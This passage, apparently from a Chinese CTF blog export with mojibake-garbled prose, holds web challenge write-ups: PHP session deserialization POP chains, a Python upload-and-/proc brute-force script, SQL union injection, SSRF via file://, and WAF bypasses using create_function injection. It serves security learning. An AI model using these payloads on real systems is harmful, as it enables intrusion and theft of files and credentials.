1a:2:&#123;s:12:&quot;ctfshowdaniu&quot;;s:70:&quot;s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:36:&quot;L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==&quot;;&#125;&quot;;s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;&#125; è€Œåˆ©ç”¨è¿™ä¸ªå‡½æ•°ååæ‰äº†ctfshowdaniuï¼Œå› æ­¤åºåˆ—åŒ–å†…å®¹å˜æˆäº†ä¸‹é¢è¿™ä¸ªï¼š 1a:2:&#123;s:12:&quot;&quot;;s:70:&quot;s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:36:&quot;L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==&quot;;&#125;&quot;;s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;&#125; é‚£ä¹ˆæ›¿æ¢æˆç©ºåï¼Œåˆéœ€è¦12ä¸ªå­—ç¬¦ï¼Œå› æ­¤åé¢çš„12ä¸ªå­—ç¬¦&quot;;s:70:&quot;s:1:å°±è¢«å½“åšäº†å­—ç¬¦ä¸²å¤„ç†ã€‚è€Œè¿™ä¸ª70è¢«å±è”½åpayloadé•¿åº¦å°±æ²¡æœ‰é™åˆ¶äº†ï¼Œå› æ­¤åé¢&quot;;s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;&#125;çš„éƒ¨åˆ†å°±ä¸ä¼šæœ‰ä½œç”¨äº†ã€‚ æœ€åæŸ¥çœ‹æ—¥å¿—å¾—åˆ°ä¿¡æ¯ï¼Œè®¿é—®http://127.0.0.1/ctfshowå¾—åˆ°flagã€‚ web7æŸ¥çœ‹æºç ï¼š 12345678910111213141516171819&lt;?phpinclude(&quot;class.php&quot;);error_reporting(0);highlight_file(__FILE__);ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);session_start();if (isset($_GET[&#x27;phpinfo&#x27;]))&#123; phpinfo();&#125;if (isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(&quot;class.php&quot;);&#125;$happy=new Happy();$happy();?&gt; class.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293$happy=new Happy();$happy();?&gt;&lt;?php class Happy &#123; public $happy; function __construct()&#123; $this-&gt;happy=&quot;Happy_New_Year!!!&quot;; &#125; function __destruct()&#123; $this-&gt;happy-&gt;happy; &#125; public function __call($funName, $arguments)&#123; die($this-&gt;happy-&gt;$funName); &#125; public function __set($key,$value) &#123; $this-&gt;happy-&gt;$key = $value; &#125; public function __invoke() &#123; echo $this-&gt;happy; &#125; &#125; class _New_&#123; public $daniu; public $robot; public $notrobot; private $_New_; function __construct()&#123; $this-&gt;daniu=&quot;I&#x27;m daniu.&quot;; $this-&gt;robot=&quot;I&#x27;m robot.&quot;; $this-&gt;notrobot=&quot;I&#x27;m not a robot.&quot;; &#125; public function __call($funName, $arguments)&#123; echo $this-&gt;daniu.$funName.&quot;not exists!!!&quot;; &#125; public function __invoke() &#123; echo $this-&gt;daniu; $this-&gt;daniu=$this-&gt;robot; echo $this-&gt;daniu; &#125; public function __toString() &#123; $robot=$this-&gt;robot; $this-&gt;daniu-&gt;$robot=$this-&gt;notrobot; return (string)$this-&gt;daniu; &#125; public function __get($key)&#123; echo $this-&gt;daniu.$key.&quot;not exists!!!&quot;; &#125; &#125; class Year&#123; public $zodiac; public function __invoke() &#123; echo &quot;happy &quot;.$this-&gt;zodiac.&quot; year!&quot;; &#125; function __construct()&#123; $this-&gt;zodiac=&quot;Hu&quot;; &#125; public function __toString() &#123; $this-&gt;show(); &#125; public function __set($key,$value)#3 &#123; $this-&gt;$key = $value; &#125; public function show()&#123; die(file_get_contents($this-&gt;zodiac)); &#125; public function __wakeup() &#123; $this-&gt;zodiac = &#x27;hu&#x27;; &#125; &#125;?&gt; æˆ‘ç°åœ¨ä¿®æˆå½’æ¥ï¼Œé¦–å…ˆæŸ¥çœ‹phpinfoï¼š å®Œç¾ç¬¦åˆSessionååºåˆ—åŒ–çš„ç‰¹å¾ï¼Œæ¥ä¸‹æ¥é‡ç‚¹å°±æ˜¯åˆ†æpopé“¾äº†ã€‚å®¡è®¡ä»£ç ï¼Œå‘ç°file_get_contents()å‡½æ•°å­˜åœ¨äºYearç±»çš„show()ä¸­ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯popé“¾çš„ç»ˆç‚¹ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç»ˆç‚¹ï¼Œæˆ‘ä»¬å‘ç°Yearç±»çš„__toString()é­”æœ¯æ–¹æ³•ä¸­æœ‰è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬è¦è®©$zodiacçš„å€¼ä¸ºYearç±»çš„å®ä¾‹åŒ–å¯¹è±¡ã€‚è€Œä¸ºäº†åˆ°è¾¾è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬è¦ç”¨åˆ°_New_ç±»ä¸­çš„__toString()é­”æœ¯æ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸ªé­”æœ¯æ–¹æ³•ä¸­å­˜åœ¨$this-&gt;daniu-&gt;$robot=$this-&gt;notrobotã€‚å› æ­¤æˆ‘ä»¬è¦è§¦å‘__get()é­”æœ¯æ–¹æ³•ï¼Œå…¶ä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥å¯ä»¥è§¦å‘_NEW_ç±»ä¸­çš„__toString()ã€‚è€Œè¦è§¦å‘__get()é­”æœ¯æ–¹æ³•éœ€è¦è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Happyç±»çš„__destruct()æ¥è¿›è¡Œè§¦å‘ã€‚ å› æ­¤popé“¾çš„é€»è¾‘å¦‚ä¸‹ï¼š 1Happy:__destruct() -&gt; _NEW_:__get() -&gt; _NEW_:__toString() -&gt; Year:__toString() -&gt; Year:show ç¼–å†™expï¼š 12345678910111213141516171819202122&lt;?php class Happy &#123; public $happy; &#125; class _New_&#123; public $daniu; public $robot; public $notrobot; &#125; class Year&#123; public $zodiac; &#125;$a = new Happy();$a -&gt; happy = new _New_();$a -&gt; happy -&gt; daniu = new _NEW_();$a -&gt; happy -&gt; daniu -&gt; daniu = new Year();$a -&gt; happy -&gt; daniu -&gt; robot = &quot;zodiac&quot;;$a -&gt; happy -&gt; daniu -&gt; notrobot = &quot;/etc/passwd&quot;;var_dump(serialize($a));?&gt; payload: 1|O:5:\\&quot;Happy\\&quot;:1:&#123;s:5:\\&quot;happy\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:4:\\&quot;Year\\&quot;:1:&#123;s:6:\\&quot;zodiac\\&quot;;N;&#125;s:5:\\&quot;robot\\&quot;;s:6:\\&quot;zodiac\\&quot;;s:8:\\&quot;notrobot\\&quot;;s:11:\\&quot;/etc/passwd\\&quot;;&#125;s:5:\\&quot;robot\\&quot;;N;s:8:\\&quot;notrobot\\&quot;;N;&#125;&#125; ç„¶åæ„é€ è¡¨å•ä¸Šä¼ æ–‡ä»¶ï¼Œæ›´æ”¹filenameä¸ºpayloadï¼Œå¾—åˆ°ä»»æ„æ–‡ä»¶è¯»å–ï¼š 12345&lt;form action=&quot;http://cd050ab5-a6ad-4f28-b9eb-195f497f0319.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; è¿™ä¸€æ­¥æ˜¯çœ‹wpå­¦åˆ°çš„ï¼Œè¿™é‡Œè¦è¯»å–/procç›®å½•ï¼Œè€Œ/proc/{pid}/cmdline æ˜¯æ‰€æœ‰ç”¨æˆ·å‡å¯è¯»çš„ï¼Œå¯ä»¥ç¼–å†™è„šæœ¬çˆ†ä¸€ä¸‹è¿›ç¨‹idçš„cmdlineï¼š 12345678910111213141516171819202122import requestsimport timedef get_file(filename): data=&quot;&quot;&quot;------WebKitFormBoundarytyYa582A3zCNLMeLContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;123------WebKitFormBoundarytyYa582A3zCNLMeLContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\\\\&quot;Happy\\\\&quot;:1:&#123;s:5:\\\\&quot;happy\\\\&quot;;O:5:\\\\&quot;_New_\\\\&quot;:3:&#123;s:5:\\\\&quot;daniu\\\\&quot;;O:5:\\\\&quot;_New_\\\\&quot;:3:&#123;s:5:\\\\&quot;daniu\\\\&quot;;O:4:\\\\&quot;Year\\\\&quot;:1:&#123;s:6:\\\\&quot;zodiac\\\\&quot;;N;&#125;s:5:\\\\&quot;robot\\\\&quot;;s:6:\\\\&quot;zodiac\\\\&quot;;s:8:\\\\&quot;notrobot\\\\&quot;;s:&quot;&quot;&quot;+str(len(filename))+&quot;&quot;&quot;:\\\\\\&quot;&quot;&quot;&quot;+filename+&quot;&quot;&quot;\\\\&quot;;&#125;s:5:\\\\&quot;robot\\\\&quot;;N;s:8:\\\\&quot;notrobot\\\\&quot;;N;&#125;&#125;\\&quot;Content-Type: text/plain------WebKitFormBoundarytyYa582A3zCNLMeL--&quot;&quot;&quot; r=requests.post(url=&#x27;http://cd050ab5-a6ad-4f28-b9eb-195f497f0319.challenge.ctf.show/&#x27;,data=data,headers=&#123;&#x27;Content-Type&#x27;:&#x27;multipart/form-data; boundary=----WebKitFormBoundarytyYa582A3zCNLMeL&#x27;,&#x27;Cookie&#x27;: &#x27;PHPSESSID=a0bb8d5e6a7b50170a0f96ef5ea7c2c1&#x27;&#125;) return(r.text.encode()[1990:])for i in range(999): print(i) print(get_file(&#x27;/proc/&#x27;+str(i)+&#x27;/cmdline&#x27;)) time.sleep(0.2) å‘ç°114è¿›ç¨‹å­˜åœ¨server.pyï¼Œè¯»å–æºç ï¼š 12345678910111213141516171819from flask import *import osapp = Flask(__name__)flag=open(&#x27;/flag&#x27;,&#x27;r&#x27;)#flagæˆ‘åˆ äº†os.remove(&#x27;/flag&#x27;)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): return &quot;flagæˆ‘åˆ äº†ï¼Œä½ ä»¬åˆ«æ‰¾äº†&quot;@app.route(&#x27;/download/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def download_file(): return send_file(request.args[&#x27;filename&#x27;])if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;127.0.0.1&#x27;, port=5000, debug=False) è™½ç„¶flagè¢«åˆ äº†ï¼Œä½†æ˜¯flaskåœ¨5000ç«¯å£æœ‰ä¸€ä¸ªserverï¼Œä¸”æœ‰ä¸€ä¸ªä»»æ„è¯»å–è·¯å¾„ï¼Œå› æ­¤è¯»å–ï¼š 1http://127.0.0.1:5000/download/?filename=/proc/self/fd/3 å¾—åˆ°flagã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"buuç»ƒä¹ 2","slug":"buuç»ƒä¹ 2","date":"2022-02-21T12:23:38.000Z","updated":"2022-04-14T07:44:16.409Z","comments":true,"path":"2022/02/21/buuç»ƒä¹ 2/","link":"","permalink":"http://example.com/2022/02/21/buu%E7%BB%83%E4%B9%A02/","excerpt":"å‰è¨€ åˆ·é¢˜æ²¡å•¥å¥½è¯´çš„ï¼Œå› ä¸ºæ‡’å°±æ²¡æˆªå›¾äº†ï¼Œå°½é‡è¯´çš„æ¸…æ¥šäº›ã€‚","text":"å‰è¨€ åˆ·é¢˜æ²¡å•¥å¥½è¯´çš„ï¼Œå› ä¸ºæ‡’å°±æ²¡æˆªå›¾äº†ï¼Œå°½é‡è¯´çš„æ¸…æ¥šäº›ã€‚ [RoarCTF 2019]Easy Calcè¿›ç½‘é¡µæ˜¯ä¸ªè®¡ç®—å™¨ï¼Œä½†æ˜¯çœ‹jså‘ç°calc.phpï¼Œè¿›å…¥å‘ç°æºç ï¼š 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; ä½†æ˜¯numå‚æ•°åªèƒ½ä¼ å…¥æ•°å­—ï¼Œå› æ­¤æˆ‘ä»¬è¦ç»•è¿‡wafã€‚æ–¹æ³•å°±æ˜¯åœ¨GETæ—¶é—®å¥½åé¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œè¿™é‡Œç”¨åˆ°äº†PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ã€‚phpè§£ææ—¶ä¼šæŠŠç©ºç™½ç¬¦åˆ é™¤ï¼Œæ¥ç€ç”¨chr()ç»•è¿‡å…¶ä»–wafå†…å®¹å°±è¡Œäº†ã€‚ payloadï¼š 12? num=var_dump(scandir(chr(47))) //æ‰«ææ ¹ç›®å½•? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) //åˆ—å‡ºflag [ç½‘é¼æ¯ 2018]Fakebookä¿¡æ¯æ”¶é›†å‘ç°robots.txtæ³„éœ²æºç ï¼Œå®¡è®¡æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; å‘ç°curl()ï¼Œæ€€ç–‘è€ƒå¯Ÿssrfï¼Œå¯»æ‰¾$urlçš„æ³¨å…¥ç‚¹ï¼Œç™»é™†åå‘ç°view.phpç•Œé¢ä¸‹å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œè¿›è¡Œæµ‹è¯•ï¼Œä¸‡èƒ½å¯†ç æµ‹è¯•å‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥æŸ¥è¯¢æ•°æ®ï¼š 123456789101112131415161718//æŸ¥åº“?no=233/**/union/**/select/**/1,database(),3,4--+fakebook//æŸ¥è¡¨?no=233/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()--+users//æŸ¥åˆ—å?no=233/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_schema=&#x27;fakebook&#x27;/**/and/**/table_name=&#x27;users&#x27;--+no,username,passwd,data//æŸ¥æ•°æ®?no=233/**/union/**/select/**/1,group_concat(no,username,passwd,data),3,4/**/from/**/users--+1mrl64ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:3:&quot;age&quot;;i:233;s:4:&quot;blog&quot;;s:15:&quot;mrl64.ahaha.com&quot;;&#125; å‘ç°dataä¸­åºåˆ—åŒ–å†…å®¹ï¼Œåˆ©ç”¨æºç ä¸­çš„ååºåˆ—åŒ–è¿›è¡Œæ³¨å…¥ï¼š 1234567891011121314&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;$a = new UserInfo();echo serialize($a);//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125; payload: 1?no=233/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;hacker&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; [RoarCTF 2019]Easy Javaå› ä¸ºç¼ºä¹å¯¹åº”çš„çŸ¥è¯†è¿™é¢˜æƒ³äº†æŒºä¹…çš„ï¼Œä¹Ÿæ˜¯çœ‹äº†wpæ‰å­¦åˆ°çš„ã€‚è¿›å…¥ç½‘é¡µæ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä¸‹é¢æœ‰ä¸ªhelpï¼Œç‚¹è¿›helpå‘ç°urlå­˜ç–‘ï¼š 1http://c9fafc43-ee05-4188-981e-dff5ae10fed7.node4.buuoj.cn:81/Download?filename=help.docx å°†GETä¼ å€¼æ”¹ä¸ºPOSTåå‘ç°å¯ä»¥ä¸‹è½½æ–‡ä»¶ï¼Œä½†æ˜¯flagä¸å­˜åœ¨help.docxä¸­ï¼ŒæŸ¥è¯¢å„ç§èµ„æ–™åå‘ç°è¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ªä¿¡æ¯æ³„éœ²ï¼š WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚ å› æ­¤æˆ‘ä»¬POSTå€¼è·å–æ–‡ä»¶ï¼š 1filename=WEB-INF/web.xml æŸ¥çœ‹æ–‡ä»¶æ‰¾åˆ°flagç›®å½•ï¼Œç›´æ¥ä¸‹è½½åè§£ç ï¼š 12http://c9fafc43-ee05-4188-981e-dff5ae10fed7.node4.buuoj.cn:81/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class//æ”¹ä¸ºPOSTä¼ å€¼ [BJDCTF2020]EzPHPå®¡æŸ¥å…ƒç´ å‘ç°æç¤ºï¼Œbase32è§£ç ç»“æœä¸º1nD3x.phpï¼Œè®¿é—®é¡µé¢æŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125;if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; ?&gt; ä¸€æ­¥ä¸€æ­¥å®¡è®¡ï¼Œç¬¬ä¸€æ­¥è¦ç»•è¿‡$_SERVER[&#39;QUERY_STRING&#39;]ï¼Œè¿™ä¸ªå‡½æ•°ä¸ä¼šè¿›è¡Œurldecodeï¼Œå› æ­¤å¯ä»¥ç”¨urlç¼–ç ç»•è¿‡ã€‚ç¬¬äºŒæ­¥è¦ç»•è¿‡preg_match(&#39;/^$/&#39;)ï¼Œè¿™é‡Œç”¨æ¢è¡Œç¬¦ç»•è¿‡ã€‚ç¬¬ä¸‰æ­¥$_REQUESTç»•è¿‡ï¼Œè¿™é‡Œæ˜¯æ ¹æ®POSTä¼˜å…ˆçº§é«˜äºGETæ¥ç»•è¿‡çš„ã€‚ç¬¬å››æ­¥file_get_contentsï¼Œè€æœ‹å‹ä¼ªåè®®å°±å®Œäº‹äº†ã€‚ç¬¬äº”æ­¥sha1()æ¯”è¾ƒï¼Œæ•°ç»„å°±å¯ä»¥äº†ã€‚ å› æ­¤æ„é€ payloadï¼š 12345?deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a&amp;sh%61na[]=1&amp;p%61sswd[]=2POST:file=1&amp;debu=1 æœ€åæ˜¯ç¬¬å…­æ­¥ï¼Œæˆ‘ä»¬å‘ç°$codeå’Œ$argæ˜¯å¯æ§çš„ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨create_function()æ¥ç»•è¿‡ã€‚ create_function()èŒƒä¾‹ï¼š 1234567$mrl64 = create_function(&#x27;$a,$b&#x27;,&#x27;return $a + &amp;b&#x27;)ç­‰ä»·äºfunction mrl64($a,$b)&#123; return $a+$b;&#125; åˆ©ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»º$code(&#39;&#39;,$arg)æ¥è¿›è¡Œç»•è¿‡ï¼š 12345678payload:flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//ç­‰ä»·äºfunction a(&#x27;&#x27;,$arg)&#123; return &#125;var_dump(get_defined_vars());//&#125; è¿™æ ·æ„å»ºçš„æ€è·¯å°±æ˜¯é—­åˆaå‡½æ•°ï¼Œå¹¶ä¸”è·Ÿä¸Šæ‰§è¡Œä»£ç ï¼Œæœ€åç”¨æ³¨é‡Šç¬¦å°†åé¢çš„å†…å®¹æ³¨é‡Šæ‰ï¼Œpayloadï¼š 1234567?deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a&amp;sh%61na[]=1&amp;p%61sswd[]=2&amp;fl%61g[c%6fde]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//debu=1&amp;file=1 è¯»å–åˆ°å˜é‡ï¼š 1[&quot;ffffffff11111114ggggg&quot;]=&gt; string(89) &quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot; &#125; ä½†æ˜¯è®¿é—®è¿›å»åæˆ‘ä»¬å‘ç°æ²¡æœ‰ç»™æˆ‘ä»¬flagï¼Œå› æ­¤çŒœæµ‹å¯èƒ½flagè¢«è¿‡æ»¤äº†ï¼Œè¦åœ¨å‰ä¸€ä¸ªç½‘é¡µä¸­è¯»å–ï¼Œpayloadï¼š 1234567?deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a&amp;sh%61na[]=1&amp;p%61sswd[]=2fl%61g[c%6fde]=create_function&amp;fl%61g[%61rg]=&#125;require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//debu=1&amp;file=1 è¿˜æ˜¯ä¸ªå‡flagï¼Œé‚£å°±ç”¨ä¼ªåè®®è¯»å–ï¼Œè·å–flagï¼Œç”¨å–åç»•è¿‡è¿‡æ»¤ã€‚ [NCTF2019]True XML cookbookè¿™é¢˜æŒ‰é¢˜ç›®çœ‹æ˜¯XXEï¼Œä½†æ˜¯ç”¨xmlé…åˆä¼ªåè®®è¯»å–æºç æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰æ•ˆå†…å®¹ï¼Œç”¨æºç ä¸­çš„è´¦å·å¯†ç ä¹Ÿæ²¡æœ‰æœ‰ç”¨ä¿¡æ¯ã€‚æ€è€ƒXXEå¯ä»¥ç”¨æ¥æ‰“å†…ç½‘ï¼Œå¯»æ‰¾å­˜æ´»ä¸»æœºï¼Œæœç´¢/etc/hostsæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆä¿¡æ¯ï¼Œçœ‹äº†wpçŸ¥é“äº†è¿™é‡Œè¦è¯»å–/proc/net/arpæ–‡ä»¶ï¼Œæ‰¾åˆ°10.128.253.12ã€‚ ç›´æ¥è®¿é—®ä¼šæŠ¥é”™ï¼Œå°è¯•çˆ†ç ´cæ®µï¼Œæœ€åçˆ†ç ´å‡ºæ­£ç¡®ç½‘æ®µï¼Œè·å–flagã€‚ [Zer0pts2020]Can you guess it?é¢˜ç›®ç»™äº†æºç ï¼Œç›´æ¥å®¡è®¡ï¼š 12345678910111213141516171819202122&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;$secret = bin2hex(random_bytes(64)); //ç”Ÿæˆä¸€ä¸ªéšæœºæ•°if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if (hash_equals($secret, $guess)) &#123; //æ¯”è¾ƒguessä¸secret $message = &#x27;Congratulations! The flag is: &#x27; . FLAG; &#125; else &#123; $message = &#x27;Wrong.&#x27;; &#125;&#125;?&gt; æˆ‘ä»¬æ˜¯ä¸å¯èƒ½çŒœå‡ºæ¥è¿™ä¸ªéšæœºæ•°çš„ï¼Œå› æ­¤ä¸‹åŠéƒ¨åˆ†çš„ä»£ç åŸºæœ¬æ²¡ç”¨ï¼Œé‡è¦çš„éƒ¨åˆ†åœ¨ä¸Šé¢ã€‚ é¦–å…ˆå‘Šè¯‰æˆ‘ä»¬flagåœ¨config.phpä¸­ï¼Œæ¥ç€å‘ç°highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));è¿™ä¸²ä»£ç ï¼Œå…¶ä¸­$_SERVER[&#39;PHP_SELF&#39;])è¿”å›æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬åï¼Œè€Œbasename()è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œä¾‹å¦‚ï¼š 1basename(&quot;/path/home.php&quot;)--&gt;home.php å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°è¯»å–config.phpæ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®/index.php/config.phpï¼Œè¿™æ 